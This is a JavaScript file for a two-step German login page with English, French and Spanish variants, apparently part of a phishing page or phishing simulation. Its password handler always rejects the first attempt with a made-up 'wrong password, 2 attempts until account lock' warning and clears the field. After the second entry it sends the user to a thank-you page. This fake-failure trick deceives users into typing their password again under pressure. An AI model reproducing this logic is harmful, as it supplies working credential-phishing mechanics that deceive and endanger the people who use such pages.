document.addEventListener("DOMContentLoaded", function () {
  window.goToStep2 = function () {
    document.getElementById("step1").style.display = "none";
    document.getElementById("step2").style.display = "block";
    validateStep2();
  };

  window.goToStep1 = function () {
    document.getElementById("step2").style.display = "none";
    document.getElementById("step1").style.display = "block";
  };

  const usernameInput = document.getElementById("username");
  const passwordInput = document.getElementById("password");
  const passwordError = document.getElementById("password-error");

  const step1Button = document.getElementById("step1-button");
  const step2Button = document.getElementById("step2-button");

  let firstTry = true;

  function validateStep1() {
    step1Button.disabled = usernameInput.value.trim() === "";
  }

  function validateStep2() {
    const usernameFilled = usernameInput.value.trim() !== "";
    const passwordFilled = passwordInput.value.trim() !== "";
    step2Button.disabled = !(usernameFilled && passwordFilled);
  }

  if (usernameInput && step1Button) {
    validateStep1();
    usernameInput.addEventListener("input", () => {
      validateStep1();
      validateStep2();
    });
  }

  if (passwordInput) {
    passwordInput.addEventListener("input", validateStep2);
  }

  if (step2Button) {
    step2Button.addEventListener("click", function (e) {
      e.preventDefault();

      if (firstTry) {
        
        passwordError.textContent = "Falsches Passwort. Noch 2 Versuche bis Kontosperrung.";
        passwordError.style.display = "block";
        passwordInput.value = "";
        passwordInput.focus();
        validateStep2();
        firstTry = false;
      } else {
        passwordError.style.display = "none";

        const selectedLang = document.getElementById("language")?.value || "de";
        let targetPage = "danke.html"; 

        switch (selectedLang) {
          case "en":
            targetPage = "danke_eng.html";
            break;
          case "fr":
            targetPage = "danke_fr.html";
            break;
          case "es":
            targetPage = "danke_es.html";
            break;
        }

        window.location.href = targetPage;
      }
    });
  }

  const langSelect = document.getElementById("language");
  if (langSelect) {
    langSelect.addEventListener("change", function () {
      const lang = this.value;
      switch (lang) {
        case "de":
          window.location.href = "/index.html";
          break;
        case "en":
          window.location.href = "/en.html";
          break;
        case "fr":
          window.location.href = "/fr.html";
          break;
        case "es":
          window.location.href = "/es.html";
          break;
      }
    });
  }
});
